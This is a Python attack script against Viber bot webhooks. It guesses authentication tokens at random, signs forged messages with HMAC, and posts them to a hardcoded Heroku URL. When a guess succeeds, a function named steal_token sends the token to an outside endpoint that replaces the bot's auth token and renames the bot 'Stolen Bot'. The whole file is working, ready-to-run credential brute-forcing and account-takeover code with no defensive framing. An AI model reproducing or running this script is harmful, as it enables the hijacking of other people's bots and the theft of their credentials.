import datetime
import hashlib
import hmac
import json
import logging
import random
from optparse import OptionParser

import requests

LIMIT = 1000
URL = 'https://intense-reaches-70533.herokuapp.com/'
TOKEN = '4453b6ac12345678-e02c5f12174805f9-daec9cbb5448c51f'


def read(filename):
    with open(filename, mode='r') as fp:
        data = json.load(fp)
    return data


PATT = 'qwertyuiopasdfghjklzxcvbnm1234567890'


def get_aqq():
    tt = ''
    for i in range(16):
        tt += random.choice(PATT)
    return tt


def get_token():
    return '{0}-{1}-{2}'.format(get_aqq(), get_aqq(), get_aqq())


def get_message_token():
    return random.randint(1000000000000000000, 9999999999999999999)


def get_message_timestamp():
    return round(datetime.datetime.now().timestamp() * 1000)


def sign_message(key, message):
    return hmac.new(bytes(key.encode('ascii')),
                    msg=json.dumps(message, sort_keys=False).encode('utf-8'),
                    digestmod=hashlib.sha256).hexdigest()


def send_message(url, message, signature):
    try:
        resp = requests.post(
            url=url,
            headers={
                'Content-Type': 'application/json',
                'X-Viber-Content-Signature': signature
            },
            json=message
        )
    except Exception as error:
        logging.error('request error {}'.format(error))
        resp = None
    return resp


def steal_token(token):
    body = {
        "name": "Stolen Bot",
        "avatar": "https://www.python.org/static/opengraph-icon-200x200.png",
        "token": token,
        "webhook": "https://intense-reaches-70533.herokuapp.com/"
    }
    try:

        resp = requests.post(
            url="https://intense-reaches-70533.herokuapp.com/replace_auth_token",
            headers={
                'Content-Type': 'application/json',
            },
            json=body
        )

    except Exception as error:
        logging.error('request error {}'.format(error))
        resp = None

    return resp


def attack(url=URL, limit=LIMIT, token=TOKEN):
    while limit > 0:
        data = read('data.json')
        for i, message in enumerate(data):
            message['timestamp'] = get_message_timestamp()
            message['message_token'] = get_message_token()

            signature = sign_message(token, message)
            resp = send_message(url, message, signature)

            if resp is not None:
                logging.info(
                    'Num: {0} status code: {1}, token: {2}, resp: {3}'.format(i, resp.status_code, token, resp.content))

                if resp.status_code == 200:

                    resp = steal_token(token)
                    if resp is not None and resp.status_code == 200:
                        logging.info("Token {} is stolen".format(token))
                        logging.info("Bot info: {}".format(resp.json()))
                        limit = 0
                        break

                else:
                    token = get_token()

        limit -= 1


if __name__ == "__main__":

    op = OptionParser()

    op.add_option("-u", "--url", type=str, default=None)
    op.add_option("-l", "--limit", type=int, default=1000)
    op.add_option("-t", "--token", type=str, default='')

    (opts, args) = op.parse_args()

    if opts.url:
        URL = opts.url
    if opts.limit:
        LIMIT = opts.limit
    if opts.token:
        TOKEN = opts.token

    logging.basicConfig(format='[%(asctime)s] %(levelname).1s %(message)s',
                        datefmt='%Y.%m.%d %H:%M:%S',
                        filename=None,
                        filemode='a',
                        level=logging.INFO)

    logging.info('Start')
    attack(URL, LIMIT, TOKEN)
    logging.info('End')
